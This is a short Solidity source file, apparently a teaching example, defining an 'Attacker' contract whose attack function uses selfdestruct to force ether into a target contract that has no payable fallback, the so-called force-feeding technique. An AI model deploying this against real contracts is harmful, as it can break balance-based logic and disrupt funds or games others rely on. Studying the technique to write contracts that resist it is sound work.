// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


contract Attacker {

  receive() external payable{}

    function attack(address target) public{
       ///use the selfdestruct keyword to send ether to the contract with no fallback, thereby force feeding. 
       selfdestruct(payable(target));
    }
}